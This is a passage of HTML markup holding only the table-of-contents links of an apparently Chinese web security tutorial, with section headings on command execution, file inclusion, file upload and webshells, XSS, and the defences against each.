href="#2-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 命令执行原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">命令执行原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">命令执行函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Linux%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Linux命令及绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E5%9F%BA%E7%A1%80%EF%BC%9A"><span class="toc-number">2.3.1.</span> <span class="toc-text">Linux基础：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.3.2.</span> <span class="toc-text">Linux命令绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 命令执行防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">2.4.1.</span> <span class="toc-text">命令执行防御：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 命令执行CVE漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">2.5.1.</span> <span class="toc-text">CVE漏洞复现：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">3.</span> <span class="toc-text">三、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%88%A0%E9%99%A4"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 任意文件读取&#x2F;删除</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">3.1.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">3.1.2.</span> <span class="toc-text">产生原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">3.1.3.</span> <span class="toc-text">文件读取函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%B8%8E%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">3.1.4.</span> <span class="toc-text">绝对路径与相对路径：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E4%BD%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">3.1.5.</span> <span class="toc-text">漏洞产生位置：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">3.1.6.</span> <span class="toc-text">利用方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.1.7.</span> <span class="toc-text">Linux系统配置文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.1.8.</span> <span class="toc-text">Windows系统配置文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.1.9.</span> <span class="toc-text">Apache日志文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.1.10.</span> <span class="toc-text">Nginx日志文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.1.11.</span> <span class="toc-text">Mysql日志文件：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 文件包含原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9A-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">产生原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">3.2.3.</span> <span class="toc-text">文件包含函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 文件包含利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI%EF%BC%9A"><span class="toc-number">3.3.1.</span> <span class="toc-text">本地文件包含LFI：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.3.2.</span> <span class="toc-text">本地文件包含利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.3.3.</span> <span class="toc-text">远程文件包含利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">3.4.1.</span> <span class="toc-text">PHP伪协议：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">3.4.2.</span> <span class="toc-text">PHP伪协议代码执行:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%98%B2%E5%BE%A1"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 文件包含防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">3.5.1.</span> <span class="toc-text">漏洞防御：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text">四、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 文件上传原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">4.1.1.</span> <span class="toc-text">文件上传原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-webshell"><span class="toc-number">4.1.2.</span> <span class="toc-text">后门 webshell:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">4.1.3.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipart-form-data%EF%BC%9A"><span class="toc-number">4.1.4.</span> <span class="toc-text">multipart&#x2F;form-data：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9A"><span class="toc-number">4.1.5.</span> <span class="toc-text">PHP文件上传：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 文件上传检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B%EF%BC%9A"><span class="toc-number">4.2.1.</span> <span class="toc-text">文件上传检测：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 文件上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">4.3.1.</span> <span class="toc-text">客户端验证绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">4.3.2.</span> <span class="toc-text">服务端验证绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 文件上传防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">4.4.1.</span> <span class="toc-text">服务端防御：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81XXS"><span class="toc-number">5.</span> <span class="toc-text">五、XXS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-XXS%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 XXS原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">5.1.1.</span> <span class="toc-text">XSS概述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A-1"><span class="toc-number">5.1.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-1"><span class="toc-number">5.1.3.</span> <span class="toc-text">利用方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">5.1.4.</span> <span class="toc-text">XSS类型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie%EF%BC%9A"><span class="toc-number">5.1.5.</span> <span class="toc-text">Cookie：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%EF%BC%9A"><span class="toc-number">5.1.6.</span> <span class="toc-text">Session：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 跨域请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-number">5.2.1.</span> <span class="toc-text">同源策略：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-number">5.2.2.</span> <span class="toc-text">跨域访问：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-XSS%E7%BB%95%E8%BF%87"><span class="toc-number">5.3.</span> <span class="toc-text">5.4 XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">5.3.1.</span> <span class="toc-text">XSS绕过：</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
